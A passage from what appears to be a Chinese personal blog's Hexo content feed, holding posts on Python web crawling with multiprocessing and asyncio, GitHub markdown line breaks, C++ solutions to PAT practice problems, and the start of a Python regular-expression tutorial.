punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#解析网页  </span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>      urls <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'href'</span><span class="token punctuation">:</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">'^/.+?/$'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>      title <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>      page_urls <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">[</span>urljoin<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> url<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">]</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'property'</span><span class="token punctuation">:</span> <span class="token string">'og:url'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>      <span class="token keyword">return</span> title<span class="token punctuation">,</span> page_urls<span class="token punctuation">,</span> url  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一般方法"><a href="#一般方法" class="headerlink" title="一般方法"></a>一般方法</h3><pre class="line-numbers language-python"><code class="language-python">unseen <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">[</span>base_url<span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  seen <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>  count<span class="token punctuation">,</span> t1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">while</span> len<span class="token punctuation">(</span>unseen<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> restricted_crawl <span class="token operator">and</span> len<span class="token punctuation">(</span>seen<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">20</span><span class="token punctuation">:</span>          <span class="token keyword">break</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nDistributed Crawling.....'</span><span class="token punctuation">)</span>      htmls <span class="token operator">=</span> <span class="token punctuation">[</span>crawl<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> unseen<span class="token punctuation">]</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nDistributed Parsing.....'</span><span class="token punctuation">)</span>      results <span class="token operator">=</span> <span class="token punctuation">[</span>parse<span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token keyword">for</span> html <span class="token keyword">in</span> htmls<span class="token punctuation">]</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nAnalysing.....'</span><span class="token punctuation">)</span>      seen<span class="token punctuation">.</span>update<span class="token punctuation">(</span>unseen<span class="token punctuation">)</span>      unseen<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> title<span class="token punctuation">,</span> page_urls<span class="token punctuation">,</span> url <span class="token keyword">in</span> results<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span>          count <span class="token operator">+=</span> <span class="token number">1</span>          unseen<span class="token punctuation">.</span>update<span class="token punctuation">(</span>page_urls <span class="token operator">-</span> seen<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Total time: %.1fs"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多线程分布式"><a href="#多线程分布式" class="headerlink" title="多线程分布式"></a>多线程分布式</h3><pre class="line-numbers language-python"><code class="language-python">unseen <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">[</span>base_url<span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  seen <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>  pool <span class="token operator">=</span> mp<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                         count<span class="token punctuation">,</span> t1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">while</span> len<span class="token punctuation">(</span>unseen<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                 <span class="token comment" spellcheck="true"># still get some url to visit  </span>    <span class="token keyword">if</span> restricted_crawl <span class="token operator">and</span> len<span class="token punctuation">(</span>seen<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">20</span><span class="token punctuation">:</span>              <span class="token keyword">break</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nDistributed Crawling...'</span><span class="token punctuation">)</span>      crawl_jobs <span class="token operator">=</span> <span class="token punctuation">[</span>pool<span class="token punctuation">.</span>apply_async<span class="token punctuation">(</span>crawl<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> unseen<span class="token punctuation">]</span>      htmls <span class="token operator">=</span> <span class="token punctuation">[</span>j<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> crawl_jobs<span class="token punctuation">]</span>                                       <span class="token comment" spellcheck="true"># request connection  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nDistributed Parsing...'</span><span class="token punctuation">)</span>      parse_jobs <span class="token operator">=</span> <span class="token punctuation">[</span>pool<span class="token punctuation">.</span>apply_async<span class="token punctuation">(</span>parse<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> html <span class="token keyword">in</span> htmls<span class="token punctuation">]</span>      results <span class="token operator">=</span> <span class="token punctuation">[</span>j<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> parse_jobs<span class="token punctuation">]</span>                                     <span class="token comment" spellcheck="true"># parse html  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nAnalysing...'</span><span class="token punctuation">)</span>      seen<span class="token punctuation">.</span>update<span class="token punctuation">(</span>unseen<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># seen the crawled  </span>    unseen<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment" spellcheck="true"># nothing unseen  </span>    <span class="token keyword">for</span> title<span class="token punctuation">,</span> page_urls<span class="token punctuation">,</span> url <span class="token keyword">in</span> results<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span>          count <span class="token operator">+=</span> <span class="token number">1</span>          unseen<span class="token punctuation">.</span>update<span class="token punctuation">(</span>page_urls <span class="token operator">-</span> seen<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># get new url to crawl  </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Total time: %.1f s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>t1<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 16 s !!!  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="异步爬虫"><a href="#异步爬虫" class="headerlink" title="异步爬虫"></a>异步爬虫</h2><h3 id="普通"><a href="#普通" class="headerlink" title="普通"></a>普通</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> time  <span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start job'</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设置延迟  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Job'</span><span class="token punctuation">,</span> t<span class="token punctuation">,</span> <span class="token string">'takes'</span> <span class="token punctuation">,</span> t<span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token punctuation">[</span>job<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">for</span> t <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  main<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No async total time: '</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> asyncio  <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start job '</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>      <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>t<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># wait for "t" seconds, it will look for another job while await  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Job '</span><span class="token punctuation">,</span> t<span class="token punctuation">,</span> <span class="token string">' takes '</span><span class="token punctuation">,</span> t<span class="token punctuation">,</span> <span class="token string">' s'</span><span class="token punctuation">)</span>  <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>loop<span class="token punctuation">)</span><span class="token punctuation">:</span>      tasks <span class="token operator">=</span> <span class="token punctuation">[</span>loop<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>job<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> t <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true"># just create, not run job  </span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>                                   <span class="token comment" spellcheck="true"># run jobs and wait for all tasks done  </span>t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>  loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>main<span class="token punctuation">(</span>loop<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># loop.close()                          # Ipython notebook gives error if close loop  </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Async total time : "</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="普通爬取"><a href="#普通爬取" class="headerlink" title="普通爬取"></a>普通爬取</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests  <span class="token keyword">import</span> time  URL <span class="token operator">=</span> <span class="token string">'https://morvanzhou.github.io/'</span>  <span class="token keyword">def</span> <span class="token function">normal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>          url <span class="token operator">=</span> r<span class="token punctuation">.</span>url          <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>  t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  normal<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Normal total time'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="异步爬取"><a href="#异步爬取" class="headerlink" title="异步爬取"></a>异步爬取</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> aiohttp <span class="token comment" spellcheck="true"># 异步加载网页模块  </span><span class="token keyword">import</span> asyncio  <span class="token keyword">import</span> time  URL <span class="token operator">=</span> <span class="token string">'https://morvanzhou.github.io/'</span>  <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>      response <span class="token operator">=</span> <span class="token keyword">await</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>      <span class="token keyword">return</span> str<span class="token punctuation">(</span>response<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>loop<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>          tasks <span class="token operator">=</span> <span class="token punctuation">[</span>loop<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>job<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>          finished<span class="token punctuation">,</span> unfinished <span class="token operator">=</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>          all_results <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> finished<span class="token punctuation">]</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>all_results<span class="token punctuation">)</span>  t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>  loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>main<span class="token punctuation">(</span>loop<span class="token punctuation">)</span><span class="token punctuation">)</span>  loop<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Async total time:"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub 第一坑</title>
      <link href="/2019/03/20/2019-github-bo-ke/"/>
      <url>/2019/03/20/2019-github-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="GitHub-第一坑"><a href="#GitHub-第一坑" class="headerlink" title="GitHub 第一坑"></a>GitHub 第一坑</h1><h2 id="为什么自己在GitHub写的博客换行不正常"><a href="#为什么自己在GitHub写的博客换行不正常" class="headerlink" title="为什么自己在GitHub写的博客换行不正常"></a>为什么自己在GitHub写的博客换行不正常</h2><blockquote><p>这几天快被GitHub的博客给坑死了,今天填了这个坑,愿我们永不落坑  </p></blockquote><p><strong>原因其实很简单</strong><br>GitHub对你用markdown写的文档编译成html时,只有当行末有至少两个空格时才会进行换行,所以呢在写博客的时候在每行后面添加两个以上的空格比较保险。<br>又有人要说了，我那么多博客，一个一个加空格得累死，哈哈哈，这个时候python就派上用场了，很是方便呢.  </p><blockquote><p>会点python的话<a href="https://github.com/newlzs/python_tools/tree/master/github%E4%BB%A3%E7%A0%81%E6%8D%A2%E8%A1%8C%E6%9B%B4%E6%AD%A3" target="_blank" rel="noopener">源码</a>带走!  </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 填坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Blog</title>
      <link href="/2019/03/19/2019-myfirstblog/"/>
      <url>/2019/03/19/2019-myfirstblog/</url>
      
        <content type="html"><![CDATA[<h2 id="我的第一篇GitHub博客"><a href="#我的第一篇GitHub博客" class="headerlink" title="我的第一篇GitHub博客"></a>我的第一篇GitHub博客</h2><p>感谢<a href="https://www.jianshu.com/p/e68fba58f75c" target="_blank" rel="noopener">BY</a>  </p><blockquote><p>前人栽树, 后人乘凉  </p></blockquote><iframe src="//player.bilibili.com/player.html?aid=16076148&cid=26273686&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      
        <tags>
            
            <tag> 关于生活^_^ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT乙级1024 科学计数法</title>
      <link href="/2019/02/26/2019-patb1024/"/>
      <url>/2019/02/26/2019-patb1024/</url>
      
        <content type="html"><![CDATA[<blockquote><p>铛铛铛， 感觉这道题有点难，不过在抡蒙纂，瞎写之下居然过了，回顾一下加深印象😃  </p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p><strong>1024 科学计数法</strong> （20 分<br>科学计数法是科学家用来表示很大或很小的数字的一种方便的方法，其满足正则表达式 [+-][1-9].[0-9]+E[+-][0-9]+，即数字的整数部分只有 1 位，小数部分至少有 1 位，该数字及其指数部分的正负号即使对正数也必定明确给出。<br>现以科学计数法的格式给出实数 A，请编写程序按普通数字表示法输出 A，并保证所有有效位都被保留。  </p></blockquote><blockquote><p>输入格式：<br>每个输入包含 1 个测试用例，即一个以科学计数法表示的实数 A。该数字的存储长度不超过 9999 字节，且其指数的绝对值不超过 9999。<br>输出格式：<br>对每个测试用例，在一行中按普通数字表示法输出 A，并保证所有有效位都被保留，包括末尾的 0。  </p></blockquote><blockquote><p>输入样例 1：<br><code>+1.23400E-03</code><br>  输出样例 1：<br>  0.00123400<br><code>输入样例 2：</code> -1.2E+10<code>输出样例 2：</code> -12000000000`  </p></blockquote><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="看题分析一下"><a href="#看题分析一下" class="headerlink" title="看题分析一下"></a>看题分析一下</h3><ul><li>指数可以高达999,所以直接放弃使用数字表示,转而选用字符串或者直接输出结果(因为在输出的过程中不在涉及到输入), ok 我选择直接输出,方便点。  </li><li>还有就是要保留所有有效位数,意思就是所有E之前的数字都要输出。  </li></ul><h3 id="话不多说放代码"><a href="#话不多说放代码" class="headerlink" title="话不多说放代码"></a>话不多说放代码</h3><p><strong>牛皮的C++</strong>  </p><pre class="line-numbers language-c++"><code class="language-c++">#include<iostream>    #include<string>    using namespace std;    int main()    {      string str;        cin>>str;        int e = str.find("E"); //找到E的位置        int index = 0; //指数大小        int zhi;//指数正负        if(str[e + 1] == '+') zhi = 1;        else zhi = -1;        for(int i = e + 2;i < str.size();i ++) //求指数        {          index = index * 10 + str[i] - '0';        }       if(str[0] == '-') cout<<'-';//如果为负直接输出符号        if(zhi < 0) //如果指数为负        {          cout<<"0."; //输出前导零            for(int i = 0;i <index - 1;i ++) //输出多余的零            {              cout<<'0';            }          cout<<str[1];//输出原来的整数位            for(int i = 3;i < e;i ++)//循环输出E之前的数据           {              cout<<str[i];            }      }      else //指数大于零        {          cout<<str[1];//输出原来的整数位            for(int i = 3;i < index + 3 || i < e;i ++) //输出E之前的数和多余的零            {              if(i < e) cout<<str[i]; //如果i<e要输出本身的每一位,保证有效位数不变                else cout<<'0'; //如果指数比较大,则还要输出多余0                if(i - 3 == index - 1 && (i < e - 1 || i < index + 3 - 1))//如果本来的位数比指数还大则要补上小数点,还有保证小数点没有补在末尾                    cout<<'.';           }      }      cout<<endl;       return 0;    }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAbjJ389kR9F0nxduenGGrXGMdTX9i57hVT_KwP2IypKKYM-Up" alt="Alt"><strong>Happy everyday!</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模拟除法</title>
      <link href="/2019/02/22/2019-mo-ni-chu-fa/"/>
      <url>/2019/02/22/2019-mo-ni-chu-fa/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>PTA 乙级1017A除以B</strong>(模拟除法) ，有点意思，题目不是很难就是很难。长点心，想的全面点。  </p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>本题要求计算 A/B，其中 A 是不超过 1000 位的正整数，B 是 1 位正整数。你需要输出商数 Q 和余数 R，使得 A=B×Q+R 成立。  </p></blockquote><blockquote><p><strong>输入格式</strong>：<br>输入在一行中依次给出 A 和 B，中间以 1 空格分隔。<br><strong>输出格式</strong>：<br>在一行中依次输出 Q 和 R，中间以 1 空格分隔。  </p></blockquote><blockquote><p><strong>输入样例</strong>：<br><code>123456789050987654321</code> <code>7</code><br><strong>输出样例</strong>：<br><code>17636684150141093474</code> <code>3</code>  </p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h5 id="想一想"><a href="#想一想" class="headerlink" title="想一想"></a>想一想</h5><p>1000位的数的除法使用语言本身的数据肯定是无法计算的，那只用自己写除法了，我们自己应该就只会用小学老师教的除法计算方法吧，那就用代码把它实现就得了呗，let’s do it!  </p><h5 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h5><pre class="line-numbers language-c++"><code class="language-c++">#include<iostream>  #include<string>  using namespace std;  int main()  {      string a; //用来储存输入的1000位以内的数      long long mid = 0, b, m = 0, residue;//mid用来存每一步的余数      char answer[1001]; 储存商数      cin>>a>>b;      int test = 0;//用来判断是否已经排除了前导零      for(int i = 0;i < a.size() + 1;i ++)//读取数的每一位      {   //当每一步的商不为零时，则将这一步的商存入答案，          //或者已经排除前导零后的每一步的商，          //或者本身都不够除，也就是最后答案的商也为零也要进入这一步。          if(mid / b != 0 || test == 1 ||(mid / b == 0 && test == 0 && i == a.size()))          {              answer[m] = mid / b + '0';              m ++;              if(test == 0) { test = 1;}              if(i == a.size()) break;          }          mid = (mid % b) * 10 + a[i] - '0';//下来a中的位      }      residue = mid % b;// 由于最后一位下来后进入if后直接break了，没有取余，所以要取余      answer[m] = '\0'; //将后一位设为空防止出bug      cout<<answer<<' '<<residue<<endl;      return 0;  }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![Alt](<a href="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550834145196&amp;di=24e179af6dab9b8417236ad438ab95e2&amp;imgtype=0&amp;src=http%3A%2F%2Fww2.sinaimg.cn%2Flarge%2F6f2d851ejw1enkltdjl1xj20hs0dgwg0.jpg" target="_blank" rel="noopener">https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550834145196&amp;di=24e179af6dab9b8417236ad438ab95e2&amp;imgtype=0&amp;src=http%3A%2F%2Fww2.sinaimg.cn%2Flarge%2F6f2d851ejw1enkltdjl1xj20hs0dgwg0.jpg</a> =200x150)  </p><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/02/19/2019-zheng-ze-biao-da-shi/"/>
      <url>/2019/02/19/2019-zheng-ze-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="python-正则表达式"><a href="#python-正则表达式" class="headerlink" title="python 正则表达式"></a>python 正则表达式</h1><p>学习自<a href="https://morvanzhou.github.io/tutorials/python-basic/basic/13-10-regular-expression/" target="_blank" rel="noopener">莫烦python</a>  </p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="简单python匹配"><a href="#简单python匹配" class="headerlink" title="简单python匹配"></a>简单python匹配</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># matching string  </span>pattern1 <span class="token operator">=</span> <span class="token string">"cat"</span>  pattern2 <span class="token operator">=</span> <span class="token string">"bird"</span>  string <span class="token operator">=</span> <span class="token string">"dog rans to cat"</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>pattern1 <span class="token keyword">in</span> string<span class="token punctuation">)</span> 